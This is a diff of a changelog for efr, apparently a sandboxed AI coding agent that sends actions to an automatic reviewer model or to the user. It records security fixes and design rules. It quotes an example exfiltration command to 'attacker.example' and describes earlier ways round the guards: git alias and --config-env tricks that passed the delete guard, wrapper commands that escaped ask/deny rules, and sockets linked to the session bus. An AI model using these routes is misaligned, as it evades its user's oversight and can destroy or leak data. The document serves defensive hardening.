-  not let `curl -d @notes.txt https://attacker.example/` run without a question.
-- In `auto`, a socket that the model names goes to the reviewer, except a credential
-  agent's socket (`$SSH_AUTH_SOCK`, gpg-agent, a keyring or a password manager's
-  agent), which only you approve. A socket inside a secret, such as
-  `~/.gnupg/S.gpg-agent`, or in efr's own dirs is refused.
-- In `auto`, the read and reload forms of `hyprctl`, `swaymsg -t get_*`, `xrandr`,
-  `wlr-randr` and `niri msg` go to the reviewer. Other desktop commands still ask you.
-- A write to efr's own programs, to `$XDG_RUNTIME_DIR/efr`, to `~/.local/state/efr`
-  or to `~/.local/share/efr` is refused in every mode. Two places stay open:
-  `$SCRATCH`, which the model writes freely, and efr's trash
-  (`~/.local/share/efr/trash`), where the reviewer decides a write without a message
-  that names it.
-- The shell tool tells the model to try what you asked first, and to call again with
-  the narrowest `needs` after an access error. The note after a failed sandboxed
-  command no longer lists what the sandbox cannot do.
-- The auto rule of the system prompt is short: the model does what you ask, tries
-  first, and lets efr decide. Older prompts of a conversation keep the old rule.
-- `efr sandbox explain` says that the reviewer decides a named floor file. It adds
-  `user only` only for a kind that only you approve, such as a synced write.
-- The debug log is quieter after a turn and for unreadable files in a snapshot. A
-  write to a client that closed its connection logs at `trace`. Files that git cannot
-  read give one line for each project, with their count and the first path. A git
-  that stops with a fatal error during a snapshot is now a warning.
-- In `auto`, `i3-msg` is a desktop command. `i3-msg -t get_*` goes to the reviewer.
-- The line of a desktop command names its socket and what it does, such as
-  `reviewer allowed: the Hyprland socket, to read its state or reload it`.
-- Labels name the command that leaves the sandbox and the link path that you used,
-  such as `changed ~/.config/hypr/x.conf (real file ~/dotfiles/hypr/x.conf)`, and show
-  no rule numbers.
-- A snapshot now keeps the exact bytes of each file, also when the project's
-  `.gitattributes` asks git to change line ends or encodings. An older snapshot store
-  takes one full snapshot to get there.
-- In `auto`, a command that deletes or overwrites files in the project runs at once
-  when efr's snapshot holds every file that it can touch, such as `git reset --hard` or
-  `: > file`. A delete or a move through `apply_patch` does the same. `shred`,
-  `git clean -x`, `git reflog expire`, a file that the snapshot left out, content that
-  is only staged, and a delete above the project still go to the reviewer or to you. A
-  command that writes through a link, such as `: > link`, needs the file that the
-  link names in the snapshot too. `sandbox.ask_destructive = "always"` keeps the old
-  behaviour. In `cautious` and
+- A terminal now keeps one conversation for each registered project that you worked
+  in, and one for everything outside registered projects. The conversation changes
+  when you send a prompt, not when you `cd`: a prompt in `~/p/app` (or below)
+  continues the terminal's `app` conversation, and `cd ~` and a prompt go back to its
+  conversation outside projects. A dim line before the reply names each change, such
+  as `↪ back to "fix the tests" in app (2 h ago)` or
+  `↪ new conversation for app (from ~)`. The first line of each reply names the scope
+  (`app`, or `○ no project · ~`); the settings of a prompt follow on the same line
+  after ` · `. `conversation.tty_idle_hours` now applies to each of these
+  conversations on its own. `,new` starts a new conversation for the current scope
+  only. `efr history`, `efr undo`, `efr diff`, `efr jobs` and the other commands act
+  on the conversation of the terminal's last prompt. The new key
+  `conversation.follow_project = false` keeps one conversation per terminal, as
+  before. `efr send` typed by hand in a terminal names its shell, so a new shell on
+  the same terminal starts fresh. The first start of the new efrd updates its
+  database once. `docs/use/conversations.md` has the details.
+- In `auto`, more actions that leave the sandbox now go to the reviewer instead of to
+  you:
+  - `write_file` and `edit` outside the project and `$SCRATCH`, as a shell write there
+    does;
+  - a write that runs outside the sandbox, such as `mv src ~/x`, and an `outside`
+    call. An `outside` call whose program changed in this turn still asks you, and so
+    does one that runs an interpreter on code that efr cannot read, such as
+    `python3 -c`, `sh -c` or a script;
+  - a socket that the model names. A credential agent's socket (`$SSH_AUTH_SOCK`,
+    gpg-agent, a keyring or a password manager's agent) asks only you. A socket inside
+    a secret, such as `~/.gnupg/S.gpg-agent`, or in efr's own dirs is refused;
+  - the read and reload forms of `hyprctl`, `swaymsg -t get_*`, `xrandr`,
+    `wlr-randr`, `niri msg` and `i3-msg -t get_*`. `i3-msg` is now a desktop command.
+    Other desktop commands still ask you;
+  - the read forms of `nmcli` and `iwctl`, such as `nmcli device status`, as a request
+    for the system bus. Changes such as `nmcli radio wifi off` always ask you;
+  - `twine check` and the other `twine` forms that do not upload, which then get the
+    network;
+  - `git fetch`, `git pull` and `git push`. The reviewer sees every host behind a
+    remote name. A remote of your project that did not change since the conversation
+    started counts as named by you.
+- In `auto`, a command that deletes or overwrites files in the project now runs at
+  once when efr's snapshot holds every file that it can touch, such as
+  `git reset --hard` or `: > file`. A delete or a move through `apply_patch` does the
+  same. `shred`, `git clean -x`, `git reflog expire`, a file that the snapshot left
+  out, content that is only staged, and a delete above the project still go to the
+  reviewer or to you. A command that writes through a link, such as `: > link`, needs
+  the file that the link names in the snapshot too. The new key
+  `sandbox.ask_destructive = "always"` keeps the old behaviour. In `cautious` and
   `manual`, efr still asks you for each delete.
-- efr no longer writes `~/.local/share/efr/file-backups/`. The snapshot store
-  replaces it. efr deletes the old backups after `snapshot.max_age_days` days.
-- With `snapshot.enabled = false`, a named edit of a file that runs code later, such
-  as `~/.zshrc`, asks you again, because efr cannot copy it first.
-- `efr sandbox explain` says that `efr undo` reverts an allowed edit of a file that
-  runs code later.
-- In `auto`, the model no longer hears that background processes stop when a
-  command ends. It hears that it can start a job with `background: true`. `&`, `nohup`
-  and `setsid` in a normal command still stop when the command ends.
-- efr refuses a background job whose line asks for sudo, reads a masked file such as
-  `.env`, types into your desktop, uses the D-Bus bus or a container engine or service
-  manager socket, or changes a file that runs code later, such as `~/.zshrc`. This
-  holds in every mode, also after you answer yes. The model must run such a part in
-  the foreground. Outside `auto`, an approved job runs with your rights, so a program
-  that it starts can still do these things; only a setuid program cannot give it more
-  rights. In
-  `auto`, a delete that undo covers still goes to the reviewer when it runs as a job.
-- A program that a background job of the conversation wrote since the previous turn
-  started counts as changed in this turn, as one that a command of the turn wrote. A
-  program whose modification time (mtime) a command set back still counts as changed:
-  efr also reads its change time (ctime).
-- `efr undo` refuses while a background job of the conversation runs, or a job of
-  another conversation can write in the same project, and names it. A job outside the
-  sandbox can write everywhere, so it blocks every undo. The refusal says: `job j3 runs;
-  stop it first (efr jobs stop j3)`. When a job ends, its file changes join the turn
-  that started it, and the undo of that turn needs `--force`. A file that a later turn
-  changed in the meantime stays with that turn. Snapshots leave `$SCRATCH/jobs` out.
-  When the wake turn of a job's end changed nothing, `efr undo` with no `--turn` passes
-  over it and takes back the job's turn.
-- `nmcli` and `iwctl` now go to the reviewer as a request for the system bus.
-  Read forms such as `nmcli device status` go to the automatic reviewer; changes such
-  as `nmcli radio wifi off` always ask you. Before, the reviewer could allow them with
-  the network only, and they then failed. A background job that runs `nmcli` or
-  `iwctl` is now refused, as every job that needs the bus is.
-- `efr status` and `efr sandbox check` show whether the network view works on this
-  machine: `netview yes`, or `netview no` with the reason. With `no`, `ss` and `ip` go
-  to the reviewer. With `network.netview = false`, they show
-  `netview off (network.netview = false)`.
+- With the proxy, a fetch from an ssh remote, `ssh`, `mosh` and `autossh` run outside
+  the sandbox with your ssh keys, and only after a message of yours names the host
+  (or the remote is your project's). A line that can send ssh to another host first
+  or run a command on your machine, such as `ssh -J`, `ssh -F`,
+  `ssh -o ProxyCommand=...`, `mosh --ssh`, `git -c core.sshCommand=...` or
+  `GIT_SSH_COMMAND=...`, always asks you. A `git push` whose host efr cannot tell,
+  such as `git --git-dir=... push`, a push after a `cd` or a push to a local path,
+  also asks you.
 - In `auto`, `rustup toolchain install`, `rustup install`, `rustup update`,
   `rustup target add`, `rustup component add` and `rustup self update` now run outside
   the sandbox. The reviewer decides a release channel such as `stable`, `nightly` or
@@ -621,35 +634,65 @@ into the GitHub release notes, and it stops when the section is missing.
   names a toolchain path or a custom toolchain, or runs `rustup toolchain link` asks
   you, because the install puts programs on your `PATH`. Before, they wrote into efr's
   private layer, and the toolchain was gone after the command.
-- In `auto`, `twine check` and the other `twine` forms that do not upload now get the
-  network after a review. Before, they ran with none.
-- With the proxy, a command that names a host that is not on your allow list goes to
-  the reviewer for that one host and its port. `nslookup`, `dig`, `ping`, `nc` and
-  other programs that do not use HTTP, servers that your browser must reach, services
-  on your machine or your LAN, and other ports still get the whole network after a
-  review.
-- `git fetch`, `git pull` and `git push` now show every host behind a remote name to
-  the reviewer. A remote of your project that did not change since the conversation
-  started counts as named by you. With the proxy, a fetch from an ssh remote, `ssh`,
-  `mosh` and `autossh` run outside the sandbox with your ssh keys, and only after a
-  message of yours names the host (or the remote is your project's). A line that can
-  send ssh to another host first or run a command on your machine, such as `ssh -J`,
-  `ssh -F`, `ssh -o ProxyCommand=...`, `mosh --ssh`, `git -c core.sshCommand=...` or
-  `GIT_SSH_COMMAND=...`, always asks you. A `git push` whose host efr cannot tell,
-  such as `git --git-dir=... push`, a push after a `cd` or a push to a local path,
-  also asks you.
-- With the proxy, tools that send an Encrypted Client Hello, such as headless Chrome,
-  Electron and Playwright, cannot fetch through the proxy.
-- `efr status` and `efr sandbox check` show the network of a sandboxed command:
-  `network proxy`, `network none`, or `network none (proxy self-test failed)` when
-  `network.mode = "proxy"` but the proxy's self-test failed.
-- With `[dbus] proxy = true`, a background job can run read-only bus queries, such as
-  `systemctl --failed`, through the bus filter. The whole bus stays refused for jobs.
-- The bus filter is on by default (`dbus.proxy = true`): read-only system queries such
-  as `hostnamectl` and `systemctl --failed` run in `auto` with no review. Install
-  `xdg-dbus-proxy` for it; without it, `efr status` shows `bus filter off`, and these
-  queries go to the reviewer as before, with no warning unless you set
-  `dbus.proxy = true` yourself. `dbus.proxy = false` turns the filter off.
+- A write to efr's own programs, to `$XDG_RUNTIME_DIR/efr`, to `~/.local/state/efr`
+  or to `~/.local/share/efr` is refused in every mode. Two places stay open:
+  `$SCRATCH`, which the model writes freely, and efr's trash
+  (`~/.local/share/efr/trash`), where the reviewer decides a write without a message
+  that names it.
+- In the input row of a followed turn, Ctrl+B no longer moves the cursor back: it
+  moves the running shell call to the background (see Added). The Left arrow still
+  moves the cursor back.
+- `, resume` (with a blank after the `,`) now runs `,resume`, and does not send the
+  prompt "resume". The same rule applies to `new`, `compact`, `context`, `away` and
+  `shell`, and to `mode`, `model` and `effort` with at most one value that efr
+  accepts. In sticky mode, a line of only one of these words runs that command too. A
+  prompt with any other word stays a prompt.
+- The command line now shows a pasted prompt of several lines as you pasted it, not as
+  a quoted line (`say\ one$'\n'...`). History keeps the whole text, and Enter on it
+  sends the same prompt again.
+- efr now knows that `rsync`, `scp`, `sshfs` and `git` over ssh may ask for a
+  password, also with a remote shell in `-e`, `RSYNC_RSH`, `GIT_SSH_COMMAND` or
+  `core.sshCommand`. Such a call outside the sandbox runs past the model's timeout
+  while you follow the turn, up to `shell.interactive_timeout_minutes`, whoever
+  allowed it: you, the reviewer, a rule or full mode. Its question says that you may
+  need to type your password. A question about a sandboxed command never says so.
+- In `auto`, the model no longer hears that background processes stop when a command
+  ends. It hears that it can start a job with `background: true`. `&`, `nohup` and
+  `setsid` in a normal command still stop when the command ends.
+- The shell tool tells the model to try what you asked first, and to call again with
+  the narrowest `needs` after an access error. The note after a failed sandboxed
+  command no longer lists what the sandbox cannot do.
+- The auto rule of the system prompt is short: the model does what you ask, tries
+  first, and lets efr decide. Older prompts of a conversation keep the old rule.
+- `efr sandbox explain` says that the reviewer decides a named floor file. It adds
+  `user only` only for a kind that only you approve, such as a synced write.
+- The line of an action that leaves the sandbox names the command and the link path
+  that you used, such as
+  `changed ~/.config/hypr/x.conf (real file ~/dotfiles/hypr/x.conf)`, and shows no
+  internal rule numbers. The line of a desktop command names its socket and what it
+  does, such as `reviewer allowed: the Hyprland socket, to read its state or reload
+  it`.
+- A snapshot now keeps the exact bytes of each file, also when the project's
+  `.gitattributes` asks git to change line ends or encodings. An older snapshot store
+  takes one full snapshot to get there.
+- efr no longer writes `~/.local/share/efr/file-backups/`. The snapshot store
+  replaces it. efr deletes the old backups after `snapshot.max_age_days` days.
+- The `+`/`-` counts of the turn line and of `efr diff` use a plain `-`, not the
+  minus sign.
+- `efr status` shows its times in your time zone, such as
+  `started 2026-10-20 12:00:00 CEST (2h 0m ago)`.
+- After a restart of efrd, `efr status` says
+  `key sk-ant-...a1b2 not checked since efrd started` for a stored API key until the
+  first request with the key gets an answer, because efrd keeps the refusals of a key
+  in memory only.
+- `efr config reload`, `efr config set`, `unset` and `edit` show the warnings of the
+  reload, one dim line each: a `[model] name` of another company than
+  `[model] provider`, an always rule that a floor now disables, and a bus filter that
+  the reload turned off. Before, they went only to the log.
+- The debug log is quieter after a turn and for unreadable files in a snapshot. A
+  write to a client that closed its connection logs at `trace`. Files that git cannot
+  read give one line for each project, with their count and the first path. A git
+  that stops with a fatal error during a snapshot is now a warning.
 - The daemon's log names the providers and the vt100 screen by their new module paths,
   because four small crates are now modules of other crates. A log line of the OpenAI
   provider has the target `efr_providers::openai::...` instead of
@@ -657,128 +700,77 @@ into the GitHub release notes, and it stops when the section is missing.
   (`efr_providers::anthropic`, before `efr_provider_anthropic`) and the vt100 screen
   (`efr_screen::vt100`, before `efr_screen_vt100`). If your `EFR_LOG` or the `log` key
   names an old target, change it.
-- A git credential helper that efr does not know (not a `!` command, `libsecret`,
-  `store`, `cache` or `manager`), such as `oauth` or `pass-git-helper`, now blocks the
-  hosts of the repository's remotes for sandboxed commands, as a `!` helper does,
-  because it can hand out a token. The note names the helper. A helper for one site
-  blocks only that site.
-- A command that needs the whole session bus asks you, not the reviewer, because the
-  whole session bus can start programs outside the sandbox and read an unlocked
-  keyring. The question says so. A socket need of a session bus at another path, such
-  as one of `dbus-launch` below `/tmp`, counts too. `notify-send` runs through the bus
-  filter with no question while the filter is on. The whole system bus keeps its approver.
-- In `auto`, a host, a path or an upload that a message of yours names lets the
-  reviewer decide only when the message is in the current turn or in your turn before
-  it. An older message does not count, and then you decide: a "now do it" three turns
-  after "commit and push" asks you. After another terminal picked up the conversation,
-  only your messages since then count. The reviewer still reads all your messages.
-- The `+`/`-` counts of the turn line and of `efr diff` use a plain `-`, not the
-  minus sign.
-- `efr status` shows its times in your time zone, such as `started 2026-10-20 12:00:00
-  CEST (2h 0m ago)`.
-- `efr config reload`, `efr config set`, `unset` and `edit` show the warnings of the
-  reload, one dim line each: a `[model] name` of another company than `[model]
-  provider`, an always rule that a floor now disables, and a bus filter that the
-  reload turned off. Before, they went only to the log.
-- After a restart of efrd, `efr status` says `key sk-ant-...a1b2 not checked since
-  efrd started` for a stored API key until the first request with the key gets an
-  answer, because efrd keeps the refusals of a key in memory only.
 - The README is now short: it shows how to install efr, a short example and the
   permission modes. The details moved to the pages of the docs site in `docs/`.
+- Update `efr` and `efrd` together: an older `efr` cannot read the history of a full
+  turn. They ship together in the packages.
 
 ### Fixed
 
 - `$SCRATCH` now works in the agent's commands. The model read that `$SCRATCH` was its
   own directory, but the hidden shell did not set the variable, so `cd "$SCRATCH"` did
-  not move and a `git clone` after it landed in your project. Now every command of the
+  not move, and a `git clone` after it landed in your project. Now every command of the
   agent has `SCRATCH` set to the conversation's scratch directory: in the hidden shell,
-  in the sandbox, in an approved exit and in a background job. Your own login shell does
-  not change, and a `SCRATCH` that your startup files set does not reach the agent's
-  commands. A sandboxed command that sets `SCRATCH` changes it for that command only.
+  in the sandbox, in an approved exit and in a background job. Your own login shell
+  does not change, and a `SCRATCH` that your startup files set does not reach the
+  agent's commands. A sandboxed command that sets `SCRATCH` changes it for that
+  command only.
 - efr no longer sends an answer that may be a password into a sandboxed command. A
-  sandboxed command could show a prompt that looked like a password prompt, and efr took
-  your answer for it. Now efr stops such a command at once.
+  sandboxed command could show a prompt that looked like a password prompt, and efr
+  took your answer for it. Now efr stops such a command at once.
 - A command that waited for a password in the hidden shell after its call timed out
-  blocked every later call of the conversation for that call's timeout, with no word to
-  you. Now the next call fails at once, the model names the command, and you can answer
-  or stop it with `,shell`.
-- An `ask` or `deny` rule for `git` in `[[permissions.rules]]` now matches when git's own
-  options come before the subcommand, such as `git -C ~/p/app push origin HEAD` or
-  `git -c push.default=current push`, in both forms (`--git-dir=x` and `--git-dir x`).
-  Before, such a line ran with no question, also in full mode. An `allow` rule skips only
+  blocked every later call of the conversation for that call's timeout, with no word
+  to you. Now the next call fails at once, the model names the command, and you can
+  answer or stop it with `,shell`.
+- An `ask` or `deny` rule for `git` in `[[permissions.rules]]` now matches when git's
+  own options come before the subcommand, such as `git -C ~/p/app push origin HEAD` or
+  `git -c push.default=current push`, in both forms (`--git-dir=x` and
+  `--git-dir x`). Before, such a line ran with no question. An `allow` rule skips only
   the options that change nothing, such as `--no-pager`.
-- An `ask` or `deny` rule in `[[permissions.rules]]` now also matches the command behind
-  a wrapper, such as `env git push`, `nice -n 5 git push` or `timeout 60 git push`, and
-  a program by its path, such as `/usr/bin/git push`. Before, such a line ran with no
-  question, also in full mode. An `allow` rule still matches only the program itself.
-  A rule that matches only through a wrapper, a path or git's own options never makes
-  the effect less strict than an earlier rule, so `deny` for `nice` and then `ask` for
-  `git push` still denies `nice git push`.
-- After `efr logout anthropic` or `efr logout openai-api`, a prompt says that no key
-  is stored and how to log in. Before, a model list fetch that started before the
-  logout could end after it, and the prompt then said that the provider rejected the
-  old key.
-
-- The reviewer writes its reason before its verdict, and efr asks again once when the
-  reason is empty. The second request stays within `classifier.timeout_secs` of that
-  step.
-- In `auto`, an allowed desktop command (`hyprctl`, `swaymsg`, `wlr-randr`, `xrandr`,
-  `niri msg`, `i3-msg`) now reaches the compositor socket of your terminal's session.
-  The call gets that one socket and the one variable that names it, such as
-  `HYPRLAND_INSTANCE_SIGNATURE`. It never gets Hyprland's event socket or its log.
-  The socket must have the place and the name of that desktop's socket, such as
-  `wayland-1`, so a variable cannot name another socket of yours, such as the session
-  bus. When efr finds no such socket, the model reads "efr found no Hyprland session
-  in the terminal of this prompt". An X server that needs an X cookie is refused for
-  now, also when only your terminal has `$XAUTHORITY`.
-- After you say no, the model does not ask again for the same action in that turn.
-- The model no longer answers a prompt that you cancelled. This also holds for a turn
-  that efr stopped before this version. The first request of such a conversation
-  then misses the prompt cache once.
+- An `ask` or `deny` rule in `[[permissions.rules]]` now also matches the command
+  behind a wrapper, such as `env git push`, `nice -n 5 git push` or
+  `timeout 60 git push`, and a program by its path, such as `/usr/bin/git push`.
+  Before, such a line ran with no question. An `allow` rule still matches only the
+  program itself. A rule that matches only through a wrapper, a path or git's own
+  options never makes the effect less strict than an earlier rule, so `deny` for
+  `nice` and then `ask` for `git push` still denies `nice git push`.
+- In `auto`, an approved desktop command (`hyprctl`, `swaymsg`, `wlr-randr`,
+  `xrandr`, `niri msg`, `i3-msg`) now reaches the compositor socket of your
+  terminal's session. The call gets that one socket and the one variable that names
+  it, such as `HYPRLAND_INSTANCE_SIGNATURE`. It never gets Hyprland's event socket or
+  its log. The socket must have the place and the name of that desktop's socket, such
+  as `wayland-1`, so a variable cannot name another socket of yours, such as the
+  session bus. When efr finds no such socket, the model reads "efr found no Hyprland
+  session in the terminal of this prompt". An X server that needs an X cookie is
+  refused for now, also when only your terminal has `$XAUTHORITY`.
 - `systemctl --user` in a sandboxed command with the session bus now uses that bus.
   Before, systemd 262 looked only for its private socket, and the command failed, also
   after you allowed the whole session bus. A script that runs `systemctl --user`
   itself still fails.
-- `efr undo` now removes the empty directories that the turn made outside the
-  project, such as the `*.wants` directory that `systemctl --user enable` made. It
-  removes only an empty directory: a directory that holds a file of yours stays.
-- In `auto`, a change in a directory of your home that holds a git repository, such
-  as `~/notes` with `~/notes/.git`, no longer stops the call. efr copies the files of
-  the directory but not its `.git`, so `efr undo` reverts the files, and the end of
-  the turn says that it does not cover `~/notes/.git`.
+- After you say no, the model does not ask again for the same action in that turn.
+- The model no longer answers a prompt that you cancelled. This also holds for a turn
+  that efr stopped before this version. The first request of such a conversation
+  then misses the prompt cache once.
+- After `efr logout anthropic` or `efr logout openai-api`, a prompt says that no key
+  is stored and how to log in. Before, a model list fetch that started before the
+  logout could end after it, and the prompt then said that the provider rejected the
+  old key.
 - A prompt that waited in the queue while a config reload made `[model] name` a model
   of another company than `[model] provider` now fails with the same error as a new
   prompt, which names the cause and the fix. Before, it failed with a general error.
-- The live state of a turn that a job notice started no longer says that you sent a
-  prompt, or that your shell is in the directory of the job's turn. It says that a job
-  notice started the turn and that the turn works in that directory.
+- The warning about a `[model] name` of another company shows once in the log.
+  Before, each reload of the same file wrote it again, also a start that reloaded
+  once.
 - `efr history` prints the partial answer of an interrupted turn once. Before, it
   printed it twice.
-- The warning about a `[model] name` of another company shows once in the log. Before,
-  each reload of the same file wrote it again, also a start that reloaded once.
-- The `phase=model_answer` log line of an interrupted or failed model call says
-  `outcome=interrupted` or `outcome=error`. Before, it said `stop_reason=interrupted`,
-  which is no stop reason of the API.
 - A project that efr reaches through a symbolic link, such as `~/p` as a link to
   `/data/p`, now has one plan lock. Before, a sandboxed call that named the project
-  through the link and a file write that named it direct did not wait for each other,
-  so the write could change the project while efr prepared the call.
-- A `%` in the name of a project now shows as typed in your own prompt. `$efr_scope`
-  and `efr_prompt_info` double each `%`, so a prompt with `prompt_subst` no longer
-  reads `%~` in a name as a prompt escape. The marker of sticky mode does not change.
-- `efr jobs list` no longer shows a job as running after its end. Before, for a short
-  time after the end, the list still showed the job as running. The model's `jobs`
-  tool had the same fault.
+  through the link and a file write that named it directly did not wait for each
+  other, so the write could change the project while efr prepared the call.
 - A line that holds a command that must run outside the sandbox and other commands is
-  now refused with `refused: a command that must run outside the sandbox must run
-  alone`. Before, the refusal said "an approved command", also when you did not
-  approve anything.
-- The reviewer's prompt now asks for the parts of its answer in the order in which
-  the provider makes the model write them. Before, the prompt asked for the reason
-  first, but the provider made the model write the category first. The small model
-  often wrote no real reason, and the turn's model reviewed instead
-  (`skipped claude-haiku-5-5: parse error`). The new order is to make such answers
-  less frequent. It is not yet known whether it stops them.
+  now refused with
+  `refused: a command that must run outside the sandbox must run alone`. Before, the
+  refusal said "an approved command", also when you did not approve anything.
 - When a sandboxed command still runs at the end of its call, the end of the screen
   that the model reads no longer holds efr's own line of the hidden shell, such as
   `[[ "${functions[_efr_hs_sbx]-}..." ]] && \_efr_hs_sbx <id>`. It holds the
@@ -786,63 +778,60 @@ into the GitHub release notes, and it stops when the section is missing.
 
 ### Security
 
-- The delete guard of full mode and the exits of `auto` now read git's
-  `--config-env`, `--attr-source` and `--shallow-file` with their value as a separate
-  word. Before, `git --config-env a.b=HOME -C ~ clean -fdx` passed the delete guard, and
-  `git --attr-source HEAD push` was no upload exit.
-- The delete guard of full mode now reads an alias that the line sets for its
-  subcommand, so `git -c alias.c=clean c -fdx` in `~` asks. An alias that efr cannot
-  read, such as `-c 'alias.c=!git clean -fdx'`, asks as a clean of the whole work tree.
-  Before, such a line passed the delete guard.
-- Before an approved outside `git push`, `git fetch`, `git pull`, `git send-email`, or a
-  `gh` command that runs git, efr checks the repository's git code and that of its
-  submodules: hooks, `core.sshCommand`, transport URLs and the other settings that run
-  programs, and the programs that they run. When a sandboxed command can write one of them, or efr could
-  not check them, only you can approve, and the question names the file. efr checks
-  again right before the command runs. git options that choose the code that git runs
-  (`-c`, `--exec-path`, `--receive-pack`, `--upload-pack` and others) also ask only
-  you, and so does a git or gh line that sets a `GIT_*`, `SSH_*`, `HOME`,
-  `XDG_CONFIG_HOME` or `PATH` variable. `efr history --verbose` shows the parts that
-  a sandboxed command can write, with no user name or password of a URL.
+- Before an approved outside `git push`, `git fetch`, `git pull`, `git send-email`,
+  or a `gh` command that runs git, efr checks the repository's git code and that of
+  its submodules: hooks, `core.sshCommand`, transport URLs and the other settings that
+  run programs, and the programs that they run. When a sandboxed command can write one
+  of them, or efr could not check them, only you can approve, and the question names
+  the file. efr checks again right before the command runs. git options that choose
+  the code that git runs (`-c`, `--exec-path`, `--receive-pack`, `--upload-pack` and
+  others) also ask only you, and so does a git or gh line that sets a `GIT_*`,
+  `SSH_*`, `HOME`, `XDG_CONFIG_HOME` or `PATH` variable. `efr history --verbose` shows
+  the parts that a sandboxed command can write, with no user name or password of a
+  URL.
 - `npm publish` (also with pnpm, yarn and bun), `cargo publish` (also with
   `--no-verify`), `cargo yank` and `cargo owner` ask only you. The question says what
   they run: the project's `prepublishOnly` and `prepack` scripts, the build of the
   crate, or `.cargo/config.toml`, which can name a credential program.
+- The exits of `auto` and the delete guard of full mode now read git's
+  `--config-env`, `--attr-source` and `--shallow-file` with their value as a separate
+  word. Before, `git --attr-source HEAD push` was no upload exit.
 - A question for a line that runs `sudo` or another program as another user now takes
   an answer only from your own machine, never from a phone, also in `manual` and
-  `cautious`.
-- A full call clears sudo's cached password before and after the call. When your
-  sudoers shares the cache across terminals (`timestamp_type=global`), this also clears
-  your own terminal's cache. A hidden shell without efr's zsh integration does not run
-  a full call. A background job of full mode cannot gain rights through `sudo` or
-  another setuid program (`no_new_privs`), so it cannot use sudo's cached password; a
-  polkit rule with no authentication still works there.
-- A process that a background job outside the sandbox left behind can no longer
-  approve efr's questions or change its settings, also after it left the job's session
-  and lost its launcher: under the systemd unit, every process in efrd's own cgroup but
+  `cautious`. A phone that tries gets the text `only the user's own machine answers a
+  privilege exit, a delete that full mode guards, or a background job`.
+- A process below a hidden shell or a job that declares itself a phone now gets the
+  read scope only. Before, it could approve exits.
+- A process that a background job outside the sandbox left behind cannot approve
+  efr's questions or change its settings, also after it left the job's session and
+  lost its launcher: under the systemd unit, every process in efrd's own cgroup but
   efrd gets only the `read` scope on efr's socket.
-- While a full turn or its job runs, efr does not load a change of `config.toml` that
-  loosens permissions, and keeps it held after, also over a restart of efrd: `efr
-  status` names what loosens, and your terminal hears it once. If you did not make the
-  change, take it out of the file; then run `efr config reload`. `efr config reload`
-  does not load such a change while full work runs. A change that turns full mode off,
-  such as `permissions.allow_full = false`, applies at once, also while another change
-  is held.
-- Note: an older `efr` cannot read the history of a full turn. efr and efrd ship
-  together, so update both. `docs/permissions.md`, "Full mode", marks each floor of
-  full mode as one that holds for every process or only for what the command line
-  shows, and `docs/adr/0015-full-mode.md` records the decision.
-- A command that gets the network view runs in your machine's network namespace.
-  Only Unix and netlink sockets work there, `listen` fails, and Landlock refuses TCP
-  and connects to abstract Unix sockets outside the sandbox. Any program in such a
-  call gets the same limits.
-- Every sandboxed command could already list the mounts of the machine through
-  `/proc/<pid>/mountinfo`. The mount view adds their sizes, except for mounts of other
-  users and below hidden paths.
-- efr now uses rustls 0.23.46 for its connections to the provider. This version fixes
-  four advisories of rustls 0.23.45 (RUSTSEC-2026-0346 to RUSTSEC-2026-0349).
-- efr now uses rustls-webpki 0.103.16, which rustls uses to check certificates. This
-  version fixes the advisory RUSTSEC-2026-0382 of rustls-webpki 0.103.15.
+- A socket grant never binds the system bus, the session bus, a service manager's
+  socket (such as `systemd/private`), a container engine's socket or a desktop socket,
+  also through a link. Before, one approved socket exit for a link to the session bus
+  could reach it. Such a command now fails to start, and the sandbox says why.
+- In `auto`, the socket of a service manager, such as
+  `$XDG_RUNTIME_DIR/systemd/private`, is a privilege exit that only you approve, as a
+  container engine's socket is: a command with it could start a unit outside the
+  sandbox.
+- `~/.local/share/dbus-1` is now a floor: a sandboxed command cannot write it, and a
+  write there asks you. The bus starts the program of a service file there outside the
+  sandbox when a client calls its name.
+- The git guard now also checks the git dirs below a dir that an approved write
+  opened, also through a link, and the git dir of a repository when the write opened a
+  dir in it, such as `.git/hooks`. Before, a command that you allowed to write to a
+  repository that is not a project could plant git hooks there.
+- The hooks and config of a git submodule (`.git/modules/<name>`, also a name with `/`
+  such as `vendor/foo`, and a submodule of a submodule) stay read-only in the sandbox,
+  as the project's own do. Before, only the first level below `.git/modules` was
+  read-only. A relative `core.hooksPath` of a submodule is now read-only in the
+  submodule's own dir. After each command, the git guard also checks these
+  submodules, the git dir that a `.git` file names, and the include files and the
+  `core.hooksPath` dir that the config of each checked repository names.
+- A program whose modification time (mtime) a command set back still counts as
+  changed in the turn: efr also reads its change time (ctime). A program that a
+  background job of the conversation wrote since the previous turn started counts as
+  changed too.
 - efr now also treats `~/.config/git/credentials`, `~/.config/npm/npmrc`,
   `~/.config/pnpm/rc`, `~/.config/pypoetry/auth.toml` and
   `~/.config/composer/auth.json`, and hub's `~/.config/hub`, Copilot's
@@ -856,70 +845,14 @@ into the GitHub release notes, and it stops when the section is missing.
   credential helper. It also no longer gets a name that ends in `_AUTH`, such as
   `npm_config__auth`, or a variable whose value is a URL with a password, such as
   `PIP_INDEX_URL=https://user:token@...`, unless `sandbox.env_keep` keeps it.
-- With the proxy, when your git config (also `~/.gitconfig` and its includes) or your
-  project's `.npmrc`, `.yarnrc.yml`, `.yarnrc`, `bunfig.toml` or `.cargo/config.toml`
-  holds a password or a token for a host, efr blocks that host for sandboxed commands
-  and says why. Your git config counts also for a command outside a project. Move the
-  token to a file that the sandbox hides, such as `~/.npmrc`. A git credential helper
-  that can give a sandboxed command a token blocks its hosts too: a helper for one site
-  blocks only that site, a helper for every site blocks the hosts of the repository's
-  remotes. A `gh auth git-credential` helper blocks no host while the sandbox hides
-  gh's token (gh's `hosts.yml` is under a read mask, no `sandbox.env_keep` pattern
-  keeps a GitHub token variable, and the command has no grant of the whole session
-  bus), so `git clone` and `git fetch` from GitHub work in the sandbox. A socket grant
-  to git's credential cache asks only you.
-- With `network.mode = "proxy"`, `efr sandbox check` warns about each
-  `sandbox.env_keep` entry that looks like a secret: the proxy lets it reach the
-  allowed hosts.
-- The network proxy is on by default. It cannot see inside TLS: a sandboxed command can
-  still send data to a host on your allow list, with no credentials: at most
-  `network.max_upload_bytes` (4 MiB) per command, counted from the first byte of each
-  connection. Hosts that fetch on behalf of the client (the Go module proxy) and DNS
-  names below your own `*.suffix` entries widen this. Socket grants that reach the
-  network, such as Docker's socket, are a way around the proxy.
-  `docs/adr/0012-network-proxy.md` lists what the proxy checks and what it cannot
